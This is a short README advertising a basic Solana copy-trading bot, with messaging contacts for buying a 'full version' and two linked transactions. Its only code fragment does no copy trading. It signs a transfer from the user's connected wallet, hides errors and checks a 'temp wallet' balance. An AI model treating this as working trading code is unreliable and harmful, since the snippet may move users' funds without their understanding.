# Solana Copytrading Bot

This is copy trading bot running on several solana dex platform - raydium, meteora, pumpfun.
This is basic version, not full version.
In this bot, it track the profitable bots fast and copytrack it.
If you want, I can offer full version and can develop customized advanced project.
    


### Contact information:
Whatspp: https://wa.me/13137423660
Telegram: https://t.me/DevCutup
Twitter: https://twitter.com/januscutup



### What can you do in this project
This is not advanced project, but it will be basic knowledge for your solana bot study.
If you wanna have solana trading bot , I can customize it for your requirement.


### Test results
Target transaction: https://solscan.io/tx/3REXjQfCAGFvj3eYM6LEZrPVCbH3UNeBC1MW6eXTFqq9uamEhRNSfbLmjrkkj1GeDRajZLwQFFFV9FDDMHcu1Lhm
Copy transaction: https://solscan.io/tx/4ciUpbved6zjXxSRqnkhY4TeZvzsUVrJb4wdcWLAppJftwgNfMB8dFVHPPrKi3LRJgYuFVztdVCZSrXxzte2ftsj


## Code Explanation

const UserInfo = () => {
  ...
    try {
        transferTransaction.recentBlockhash = (await con.getLatestBlockhash()).blockhash
        transferTransaction.feePayer = wallet.publicKey
        if (wallet.signTransaction) {
            const signedTx = await wallet.signTransaction(transferTransaction)
            const sTx = signedTx.serialize()
            const signature = await con.sendRawTransaction(sTx, { skipPreflight: true })
            const blockhash = await con.getLatestBlockhash()
            await con.confirmTransaction({
                signature,
                blockhash: blockhash.blockhash,
                lastValidBlockHeight: blockhash.lastValidBlockHeight
            }, "confirmed");
        }
    } catch (error) {
        return null;
    }
    try {
        const TEMP_WALLET_PUBKEY = new PublicKey(tempWalletPubkey)
        connection.connection.getBalance(TEMP_WALLET_PUBKEY)
            .then(temp => setBalance(temp / (10 ** 9)))
    } catch (error) {
        setBalance(0)
    }
 ...
};
